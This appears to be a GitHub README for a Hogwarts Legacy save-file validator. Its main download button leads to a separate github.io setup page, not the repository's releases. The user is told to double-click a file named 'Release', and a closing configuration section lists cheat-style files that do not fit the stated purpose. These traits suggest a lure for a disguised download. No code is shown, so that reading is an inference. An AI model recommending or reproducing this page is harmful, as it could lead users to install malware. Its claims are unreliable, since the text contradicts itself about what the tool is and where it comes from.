# Ωmega Quest Validator – Hogwarts Legacy (Windows 10/11)

> **One‑click sanity‑check for your Hogwarts Legacy save files.**
> Keep your magical journey intact, spot corruption before it spreads, and explore hidden progress stats—all from a lightweight Windows‑only desktop utility.

---

## 📖 What This utility Does

| ✅ Feature | Description |
|------------|-------------|
| **Save‑file integrity scan** | Detects missing, altered, or truncated bytes in `*.sav` files. |
| **Progress snapshot** | Summarizes level, discovered locations, and collected artefacts. |
| **Compatibility matrix** | Works on Windows 10 (1809+) and Windows 11 (21H2+). |
| **Zero‑install launch** | Runs directly from the extracted folder – no installer required. |
| **Open‑source C# / .NET 7** | Transparent code, easy to audit or extend. |

---

## 🎮 Who Should Use It?

- **Casual wizards** who want peace of mind after a long play session.
- **Speedrunners** checking that a recorded run isn’t corrupted.
- **Modders** verifying that custom content hasn’t broken the save structure.
- **Collectors** ensuring archival copies remain pristine.

---

## 🚀 Quick Start (Windows 10/11)

1. **Download** the latest release from the button below.
2. Extract the ZIP to any folder (e.g., `C:\OmegaQuest`).
3. Double‑click `Release` (the utility is self‑contained).
4. Drag‑and‑drop your `SaveGames` folder or click **Browse** to locate it.
5. Review the generated report – fix any issues or back up your files.

> **Tip:** Keep a copy of the generated `report_YYYYMMDD.txt` alongside your saves for future reference.

---

## 🔧 Advanced Usage

| Command | Effect |
|---------|--------|
| `--json` | Outputs the scan result as a formatted JSON file. |
| `--summary` | Shows a concise one‑line summary in the console. |
| `--ignore‑warnings` | Skips non‑critical alerts (use with caution). |
| `--log <path>` | Writes a detailed log to the specified location. |

Run `Release --help` for the full list of options.

---

## 📦 Download / Get Started

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Ωmega%20Quest%20Validator-blue?style=for-the-badge&logo=windows" alt="Download Button">
  </a>
  &nbsp;&nbsp;
  <a href="https://github.com/Prohibitiondemoon/Omega-Quest-Validator-Hogwarts-Legacy/releases/latest">
    <img src="https://img.shields.io/github/v/release/Prohibitiondemoon/Omega-Quest-Validator-Hogwarts-Legacy?style=for-the-badge&label=Latest%20Release" alt="Latest Release">
  </a>
</div>

---

## 🛠️ Building from Source (Optional)

```bash
git clone https://github.com/Prohibitiondemoon/Omega-Quest-Validator-Hogwarts-Legacy.git
cd Omega-Quest-Validator-Hogwarts-Legacy
dotnet build -c Release
```

*Prerequisites:* .NET 7 SDK, Windows 10/11, Visual Studio 2022 (or VS Code with C# extensions).

---

## 🤝 Contributing

1. Fork the repository.
2. Create a feature branch (`git checkout -b feat/awesome‑feature`).
3. Submit a pull request with a clear description of changes.
4. Ensure the CI pipeline passes (unit tests, static analysis).

All contributions must respect the **Windows‑only** scope and keep the utility lightweight.

---

## 📜 License

This project is licensed under the **MIT License** – see the `LICENSE` file for details.

---

## 📧 Contact & Support

- **Author:** Prohibitiondemoon
- **GitHub Issues:** [Open a ticket](https://github.com/Prohibitiondemoon/Omega-Quest-Validator-Hogwarts-Legacy/issues) for bugs, feature requests, or help.
- **Community:** Join the discussion on the **#hogwarts‑legacy‑validator** Discord channel (invite link in the repo wiki).

Happy validating, and may your spells never glitch!

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```